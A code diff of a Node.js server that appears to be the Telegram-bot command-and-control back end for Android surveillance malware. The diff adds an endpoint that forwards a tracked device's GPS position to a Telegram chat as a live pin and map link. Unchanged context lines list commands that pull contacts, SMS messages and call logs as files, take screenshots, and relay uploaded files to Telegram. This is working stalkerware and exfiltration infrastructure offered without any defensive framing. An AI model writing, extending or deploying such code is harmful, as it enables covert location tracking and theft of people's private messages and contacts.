@@ -41,7 +41,7 @@ const storage = multer.diskStorage({
 const upload = multer({
     storage,
     limits: { 
-        fileSize: 50 * 1024 * 1024, // 50MB limit (Telegram's limit)
+        fileSize: 50 * 1024 * 1024, // 50MB limit
         fieldSize: 50 * 1024 * 1024
     },
     fileFilter: (req, file, cb) => {
@@ -144,7 +144,6 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
     } catch (error) {
         console.error('❌ Error sending document:', error.response?.data || error.message);
         
-        // If document fails, try sending as message with summary
         try {
             const stats = fs.statSync(filePath);
             await sendTelegramMessage(chatId, 
@@ -155,6 +154,62 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
             console.error('Error sending fallback message:', e);
         }
         return null;
+    }
+}
+
+// ============= LOCATION FORMATTER =============
+
+function formatLocationMessage(locationData) {
+    try {
+        // Parse location data if it's a string
+        let locData = locationData;
+        if (typeof locationData === 'string') {
+            try {
+                locData = JSON.parse(locationData);
+            } catch (e) {
+                // If it's not JSON, return as is
+                return locationData;
+            }
+        }
+
+        // Check if it's location data
+        if (locData.lat && locData.lon) {
+            const lat = locData.lat;
+            const lon = locData.lon;
+            const accuracy = locData.accuracy || 'Unknown';
+            const provider = locData.provider || 'unknown';
+            const altitude = locData.altitude || 0;
+            const speed = locData.speed || 0;
+            
+            // Create Google Maps link
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Format date if time exists
+            let timeStr = '';
+            if (locData.time) {
+                const date = new Date(locData.time);
+                timeStr = date.toLocaleString();
+            }
+            
+            return {
+                text: `📍 <b>Location Update</b>\n\n` +
+                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
+                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
+                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
+                      `• <b>Provider:</b> ${provider}\n` +
+                      `${altitude ? `• <b>Altitude:</b> ${altitude.toFixed(1)}m\n` : ''}` +
+                      `${speed ? `• <b>Speed:</b> ${speed.toFixed(1)} m/s\n` : ''}` +
+                      `${timeStr ? `• <b>Time:</b> ${timeStr}\n` : ''}\n` +
+                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
+                mapsUrl: mapsUrl,
+                lat: lat,
+                lon: lon
+            };
+        }
+        return { text: locationData };
+    } catch (error) {
+        console.error('Error formatting location:', error);
+        return { text: locationData };
     }
 }
 
@@ -518,7 +573,7 @@ function getHelpMessage() {
 <b>🔍 MONITORING COMMANDS</b>
 /help - Get help 
 /status - Get full device status
-/location - Get current GPS location
+/location - Get current GPS location (returns map link + pin)
 /battery - Get battery level only
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
@@ -681,6 +736,8 @@ async function handleCommand(chatId, command, messageId) {
         ackMessage = `📡 Getting network information...`;
     } else if (cleanCommand === 'screenshot_settings') {
         ackMessage = `📸 Fetching screenshot settings...`;
+    } else if (cleanCommand === 'location') {
+        ackMessage = `📍 Getting your current location... This may take a few seconds.`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
@@ -752,7 +809,7 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         // Send the file to Telegram
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
-        // Delete the file after sending (wait a bit to ensure it's sent)
+        // Delete the file after sending
         setTimeout(() => {
             try {
                 if (fs.existsSync(filePath)) {
@@ -762,13 +819,59 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             } catch (e) {
                 console.error('Error deleting file:', e);
             }
-        }, 60000); // Delete after 1 minute
+        }, 60000);
         
         res.json({ success: true, filename, size: req.file.size });
         
     } catch (error) {
         console.error('❌ File upload error:', error);
         res.status(500).json({ error: 'Upload failed: ' + error.message });
+    }
+});
+
+// ============= LOCATION ENDPOINT =============
+
+app.post('/api/location/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const locationData = req.body;
+        
+        console.log(`📍 Location data from ${deviceId}:`, locationData);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        // Format the location message
+        const formatted = formatLocationMessage(locationData);
+        
+        if (formatted.lat && formatted.lon) {
+            // Send as native Telegram location (creates a pin)
+            try {
+                await axios.post(`${TELEGRAM_API}/sendLocation`, {
+                    chat_id: chatId,
+                    latitude: formatted.lat,
+                    longitude: formatted.lon,
+                    live_period: 60
+                });
+                console.log('✅ Location pin sent');
+            } catch (e) {
+                console.error('Failed to send location pin:', e.message);
+            }
+        }
+        
+        // Send the formatted message with details and map link
+        await sendTelegramMessage(chatId, formatted.text);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Location endpoint error:', error);
+        res.status(500).json({ error: 'Location processing failed' });
     }
 });
 
@@ -831,7 +934,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
         return res.sendStatus(200);
     }
     
-    console.log(`📨 Result from ${deviceId}:`, { command, result: result?.substring(0, 50) });
+    console.log(`📨 Result from ${deviceId}:`, { command, result: result?.substring(0, 100) });
     
     const device = devices.get(deviceId);
     if (device) {
@@ -839,7 +942,13 @@ app.post('/api/result/:deviceId', async (req, res) => {
         
         if (error) {
             await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
-        } else {
+        } 
+        // Handle location results - but note that actual location data comes via /api/location endpoint
+        else if (command === 'location') {
+            // Just acknowledge that location command was executed
+            await sendTelegramMessage(chatId, result || '📍 Location command executed. Processing location data...');
+        }
+        else {
             await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
         }
     }
@@ -883,6 +992,7 @@ app.post('/api/register', async (req, res) => {
         `• /small - Max compression\n` +
         `• /medium - Balanced\n` +
         `• /original - Best quality\n\n` +
+        `<b>📍 Location:</b> Now returns map link + pin\n\n` +
         `<b>📱 Data Extraction (as files):</b>\n` +
         `• /contacts_txt - Contacts (TXT)\n` +
         `• /contacts_html - Contacts (HTML)\n` +
@@ -945,11 +1055,30 @@ app.get('/test', (req, res) => {
             <p><b>Time:</b> ${new Date().toISOString()}</p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
+            <p><b>Location:</b> Now returns map link + pin</p>
             <p><b>Commands return files:</b> /contacts_txt, /contacts_html, /sms_txt, /sms_html, /calllogs_txt, /calllogs_html</p>
             <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
+            <p><a href="/test-location" style="background: #2196F3; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Test Location Format</a></p>
         </body>
         </html>
     `);
+});
+
+app.get('/test-location', (req, res) => {
+    const testLocation = {
+        lat: 15.2736695,
+        lon: 44.2286799,
+        accuracy: 52.4,
+        provider: 'fused',
+        altitude: 2294.10009765625,
+        time: Date.now()
+    };
+    
+    const formatted = formatLocationMessage(testLocation);
+    res.json({
+        original: testLocation,
+        formatted: formatted
+    });
 });
 
 app.get('/test-help', async (req, res) => {
@@ -967,7 +1096,10 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log(`🚀 Upload directory: ${uploadDir}`);
-    console.log('\n📱 NEW FILE-BASED COMMANDS:');
+    console.log('\n📍 LOCATION FEATURE UPDATED:');
+    console.log('   └─ Now returns map link + pin');
+    console.log('   └─ Dedicated /api/location endpoint added');
+    console.log('\n📱 FILE-BASED COMMANDS:');
     console.log('   └─ /contacts_txt     - Contacts as TXT file');
     console.log('   └─ /contacts_html    - Contacts as HTML file');
     console.log('   └─ /sms_txt          - SMS as TXT file');
